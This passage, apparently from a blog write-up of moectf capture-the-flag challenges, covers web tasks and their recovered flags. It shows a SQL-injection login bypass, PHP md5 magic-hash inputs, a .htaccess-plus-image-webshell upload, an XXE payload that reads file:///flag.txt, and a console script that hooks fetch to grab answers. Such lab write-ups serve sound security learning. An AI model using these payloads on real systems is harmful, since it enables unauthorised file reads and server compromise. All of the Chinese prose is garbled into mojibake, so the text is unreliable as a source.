€â€Œâ€Œâ€Œâ€Œâ€Œâ€¬ï»¿â€â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€_â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€â€¬â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€¬ï»¿â€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€¬â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€â€¬â€â€searchingâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œï»¿_textâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€¬_â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€¬â€Œâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€¬â€Œâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€ï»¿ï»¿â€Steganography&#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨é›¶å®½å­—ç¬¦è§£å¯†å³å¯</p>
<p><img src="D:\typora_pic\image-20250907214513598.png" alt="image-20250907214513598"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;1b8956b9-a423-4101-a1bd-65be33682c82&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-web"><a href="#2-web" class="headerlink" title="2.web"></a>2.web</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>æ§åˆ¶å°ä¸¢jsfuckå³å¯</p>
<p><img src="D:\typora_pic\image-20250809121015426.png" alt="image-20250809121015426"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;jv@vScr1p7_14_so0o0o0o_inT3r3&amp;t!!!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p><img src="D:\typora_pic\image-20250809121931944.png" alt="image-20250809121931944"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;f_i2_1s_Your_g00d_fri3nd!!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>ç¬¬ä¸€ä¸ªé¡µé¢æºä»£ç å¾—åˆ°è·¯ç”±&#x2F;golden_trail,è®¿é—®ä¹‹åæŠ“åŒ…</p>
<p><img src="D:\typora_pic\image-20250809121248333.png" alt="image-20250809121248333"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;0bs3rv3_Th3_Gold3n_traiL&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>æŠ“åŒ…æ”¹å‚æ•°å³å¯</p>
<p><img src="D:\typora_pic\image-20250809122757377.png" alt="image-20250809122757377"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;g3T_P05T-TransmISsiON_1S-a-Go0d-mEtHOd!!1218&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p>ç›®å½•ç©¿è¶Š</p>
<p><img src="D:\typora_pic\image-20250809123248455.png" alt="image-20250809123248455"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;41I_1NpuT-Is_mA1ICi0u557f1e193&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><p>ç¬¬ä¸€å…³getä¼ å‚</p>
<p><img src="D:\typora_pic\image-20250809123453770.png" alt="image-20250809123453770"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3Rme0Mw</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒå…³postä¼ å‚</p>
<p><img src="D:\typora_pic\image-20250809123531835.png" alt="image-20250809123531835"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bjZyNDd1MTQ3</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰å…³æ”¹xffå¤´</p>
<p><img src="D:\typora_pic\image-20250809123653460.png" alt="image-20250809123653460"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MTBuNV95MHVy</span><br></pre></td></tr></table></figure>

<p>ç¬¬å››å…³æ”¹uaå¤´</p>
<p><img src="D:\typora_pic\image-20250809123849635.png" alt="image-20250809123849635"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X2g3N1BfbDN2</span><br></pre></td></tr></table></figure>

<p>ç¬¬äº”å…³:cookieæ”¹æˆå¦‚ä¸‹</p>
<p><img src="D:\typora_pic\image-20250809143941431.png" alt="image-20250809143941431"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M2xfMTVfcjM0</span><br></pre></td></tr></table></figure>

<p>ç¬¬å…­å…³:</p>
<p><img src="D:\typora_pic\image-20250809144034515.png" alt="image-20250809144034515"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bGx5X2gxOWgh</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸ƒå…³:å‘é€putè¯·æ±‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.114:50602/void_rebirth&quot;</span></span><br><span class="line">data = <span class="string">&quot;æ–°ç”Ÿï¼&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.put(url, data=data, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250809144242769.png" alt="image-20250809144242769"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fQ==</span><br></pre></td></tr></table></figure>

<p>æ•´åˆèµ·æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghbGx5X2gxOWghfQ==</span><br><span class="line">moectf&#123;C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!lly_h1&#125;</span><br></pre></td></tr></table></figure>

<h3 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h3><p>ä¸‡èƒ½å¯†ç å°±èƒ½ç™»å½•</p>
<p><img src="D:\typora_pic\image-20250809135901469.png" alt="image-20250809135901469"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;w3IcoMe-T0-5QI_InjECtlOnl1137fd3f6&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h3><p><img src="D:\typora_pic\image-20250809135953559.png" alt="image-20250809135953559"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> == <span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>; error <span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br><span class="line">æŒ‘ä¸¤ä¸ªä¸Šå»</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250809140130385.png" alt="image-20250809140130385"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;mdS-lS_NoT-5AF3!!43995d17e&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h3><p>sqlmapç§’äº†</p>
<p><img src="D:\typora_pic\image-20250809142856382.png" alt="image-20250809142856382"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;UnIOn_bASeD_Sq1I-ftW!!1a1580091&#125;</span><br></pre></td></tr></table></figure>

<h3 id="10-çŒœæ•°å­—æ¸¸æˆ"><a href="#10-çŒœæ•°å­—æ¸¸æˆ" class="headerlink" title="10.çŒœæ•°å­—æ¸¸æˆ"></a>10.çŒœæ•°å­—æ¸¸æˆ</h3><p>é›ªç³æ‰¾åˆ°æœ‰&#x2F;static&#x2F;main.jsæ–‡ä»¶</p>
<p><img src="D:\typora_pic\image-20250810004954772.png" alt="image-20250810004954772"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> randomNumber = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">10000</span>) + <span class="number">1</span>; <span class="comment">// 1-10000</span></span><br><span class="line"><span class="keyword">const</span> guesses = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.guesses&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lastResult = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.lastResult&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lowOrHi = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.lowOrHi&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> guessBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;guessBtn&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> guessField = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;guessField&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> guessCount = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> resetButton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkGuess</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> userGuess = <span class="title class_">Number</span>(guessField.<span class="property">value</span>);</span><br><span class="line">  <span class="keyword">if</span>(guessCount === <span class="number">1</span>) &#123;</span><br><span class="line">    guesses.<span class="property">textContent</span> = <span class="string">&#x27;ä¸Šæ¬¡çŒœçš„æ•°ï¼š&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  guesses.<span class="property">textContent</span> += userGuess + <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(userGuess === randomNumber) &#123;</span><br><span class="line">    lastResult.<span class="property">textContent</span> = <span class="string">&#x27;æ­å–œä½ ï¼çŒœå¯¹äº†ï¼&#x27;</span>;</span><br><span class="line">    lastResult.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">    lowOrHi.<span class="property">textContent</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    guessField.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    guessBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// çŒœå¯¹åè¯·æ±‚flag</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>&#125;)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.flagResult&#x27;</span>).<span class="property">textContent</span> = <span class="string">&quot;FLAG: &quot;</span> + data.<span class="property">flag</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">    <span class="title function_">setGameOver</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    lastResult.<span class="property">textContent</span> = <span class="string">&#x27;!!!æ¸¸æˆç»“æŸ!!!&#x27;</span>;</span><br><span class="line">    lastResult.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(userGuess &lt; randomNumber) &#123;</span><br><span class="line">      lowOrHi.<span class="property">textContent</span> = <span class="string">&#x27;ä½ åˆšæ‰çŒœä½äº†ï¼&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(userGuess &gt; randomNumber) &#123;</span><br><span class="line">      lowOrHi.<span class="property">textContent</span> = <span class="string">&#x27;ä½ åˆšæ‰çŒœé«˜äº†ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    guessField.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    guessBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="title function_">setGameOver</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  guessCount++;</span><br><span class="line">  guessField.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  guessField.<span class="title function_">focus</span>();</span><br><span class="line">&#125;</span><br><span class="line">guessBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, checkGuess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setGameOver</span>(<span class="params"></span>) &#123;</span><br><span class="line">  resetButton = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">  resetButton.<span class="property">textContent</span> = <span class="string">&#x27;å¼€å§‹æ–°æ¸¸æˆ&#x27;</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(resetButton);</span><br><span class="line">  resetButton.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, resetGame);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">resetGame</span>(<span class="params"></span>) &#123;</span><br><span class="line">  guessCount = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">const</span> resetParas = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.resultParas p&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; resetParas.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    resetParas[i].<span class="property">textContent</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  resetButton.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(resetButton);</span><br><span class="line"></span><br><span class="line">  guessField.<span class="property">disabled</span> = <span class="literal">false</span>;</span><br><span class="line">  guessBtn.<span class="property">disabled</span> = <span class="literal">false</span>;</span><br><span class="line">  guessField.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  guessField.<span class="title function_">focus</span>();</span><br><span class="line"></span><br><span class="line">  lastResult.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&#x27;white&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  randomNumber = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">10000</span>) + <span class="number">1</span>; <span class="comment">// 1-10000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ§åˆ¶å°ç›´æ¥çœ‹randomNumber</p>
<p><img src="D:\typora_pic\image-20250810005040285.png" alt="image-20250810005040285"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;5d439f1c-d610-e49a-f283-6711656c040b&#125;</span><br></pre></td></tr></table></figure>

<h3 id="11-ç¬¬åå››ç« -å¾¡ç¥å…³Â·è¡¥å¤©ç‰ç¢‘"><a href="#11-ç¬¬åå››ç« -å¾¡ç¥å…³Â·è¡¥å¤©ç‰ç¢‘" class="headerlink" title="11.ç¬¬åå››ç«  å¾¡ç¥å…³Â·è¡¥å¤©ç‰ç¢‘"></a>11.ç¬¬åå››ç«  å¾¡ç¥å…³Â·è¡¥å¤©ç‰ç¢‘</h3><p>ä¼ .htaccesså†ä¼ ä¸ªå›¾ç‰‡é©¬,flagåœ¨æ ¹ç›®å½•</p>
<p><img src="D:\typora_pic\image-20250817193945350.png" alt="image-20250817193945350"></p>
<h3 id="12-ç¬¬åç« -å¤©æœºç¬¦é˜µ-revenge"><a href="#12-ç¬¬åç« -å¤©æœºç¬¦é˜µ-revenge" class="headerlink" title="12.ç¬¬åç«  å¤©æœºç¬¦é˜µ_revenge"></a>12.<strong>ç¬¬åç«  å¤©æœºç¬¦é˜µ_revenge</strong></h3><p>ä¸€ä¸ªæ–‡æœ¬æ¡†,éšä¾¿è¾“å…¥ä»€ä¹ˆè¿›å»</p>
<p><img src="D:\typora_pic\image-20250817194413325.png" alt="image-20250817194413325"></p>
<p>xxeæ¼æ´,payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE é˜µæ¢ [</span><br><span class="line">  &lt;!ENTITY hacker SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;é˜µæ¢&gt;</span><br><span class="line">  &lt;è§£æ&gt;&amp;hacker;&lt;/è§£æ&gt;</span><br><span class="line">  &lt;è¾“å‡º&gt;æœªå®šä¹‰&lt;/è¾“å‡º&gt;</span><br><span class="line">&lt;/é˜µæ¢&gt;</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250817194921962.png" alt="image-20250817194921962"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;1e866128-7abe-4caa-e010-36d7bf49ab10&#125;</span><br></pre></td></tr></table></figure>

<h3 id="13-æ‘¸é‡‘å¶é‡FLAGï¼Œæ‹¼å°½å…¨åŠ›éš¾æˆ˜èƒœ"><a href="#13-æ‘¸é‡‘å¶é‡FLAGï¼Œæ‹¼å°½å…¨åŠ›éš¾æˆ˜èƒœ" class="headerlink" title="13.æ‘¸é‡‘å¶é‡FLAGï¼Œæ‹¼å°½å…¨åŠ›éš¾æˆ˜èƒœ"></a>13.<strong>æ‘¸é‡‘å¶é‡FLAGï¼Œæ‹¼å°½å…¨åŠ›éš¾æˆ˜èƒœ</strong></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">window</span>.<span class="property">__hooked__</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> origFetch = <span class="variable language_">window</span>.<span class="property">fetch</span>;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">fetch</span> = <span class="title function_">async</span> (...args) =&gt; &#123;</span><br><span class="line">            <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">origFetch</span>(...args);</span><br><span class="line">            <span class="keyword">if</span> (args[<span class="number">0</span>].<span class="title function_">includes</span>(<span class="string">&#x27;/get_challenge&#x27;</span>)) &#123;</span><br><span class="line">                res.<span class="title function_">clone</span>().<span class="title function_">json</span>().<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;=== è·å–åˆ°çœŸå®ç­”æ¡ˆ ===&#x27;</span>, data.<span class="property">numbers</span>);</span><br><span class="line">                    <span class="variable language_">window</span>.<span class="property">__answer__</span> = data.<span class="property">numbers</span>;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">__hooked__</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;å·²æŒ‚è½½ç­”æ¡ˆæŠ“å– Hookï¼Œè¯·ç‚¹å‡»å¼€å§‹æŒ‘æˆ˜æŒ‰é’®&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">window</span>.<span class="property">__answer__</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;è¿˜æ²¡è·å–åˆ°ç­”æ¡ˆï¼Œè¯·å…ˆç‚¹å‡»å¼€å§‹æŒ‘æˆ˜æŒ‰é’®&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> code = <span class="variable language_">window</span>.<span class="property">__answer__</span>;</span><br><span class="line">    <span class="keyword">const</span> buttons = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.inputContentBtnAreaItem&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!buttons.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;æœªæ‰¾åˆ°æ•°å­—æŒ‰é’®ï¼Œè¯·ç¡®ä¿æŒ‘æˆ˜ç•Œé¢å·²åŠ è½½&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">clickNext</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= code.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;=== è‡ªåŠ¨é€šå…³å®Œæˆ ===&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> num = code[i];</span><br><span class="line">        <span class="keyword">const</span> btn = <span class="title class_">Array</span>.<span class="title function_">from</span>(buttons).<span class="title function_">find</span>(<span class="function"><span class="params">b</span> =&gt;</span> b.<span class="property">textContent</span>.<span class="title function_">trim</span>() === <span class="title class_">String</span>(num));</span><br><span class="line">        <span class="keyword">if</span> (btn) &#123;</span><br><span class="line">            btn.<span class="title function_">click</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`è¾“å…¥ç¬¬<span class="subst">$&#123;i+<span class="number">1</span>&#125;</span>ä½ï¼š<span class="subst">$&#123;num&#125;</span>`</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`æ‰¾ä¸åˆ°æ•°å­—æŒ‰é’®ï¼š<span class="subst">$&#123;num&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">        <span class="comment">// 